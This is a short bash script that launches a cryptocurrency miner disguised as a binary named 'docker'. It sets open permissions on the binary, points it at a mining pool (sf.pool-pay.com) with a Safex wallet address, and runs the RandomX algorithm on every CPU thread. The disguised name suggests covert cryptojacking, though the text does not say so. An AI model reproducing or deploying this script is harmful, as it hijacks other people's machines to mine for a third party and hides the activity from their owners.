#!/bin/bash
chmod 777 docker
./docker -o sf.pool-pay.com:4025 -u Safexsp1o77aa1VcscEtwfBeDaqLyqnh4TZt1wjzAbmZ1CTTvnik8RN8fSSJnhm4BLVJB5kUokKJN8SCu7c8PZ3RJ7pfRGv5wsy4r -p $(echo $(shuf -i 1-20000 -n 1)-G) -k -a rx/sfx -t$(nproc --all)
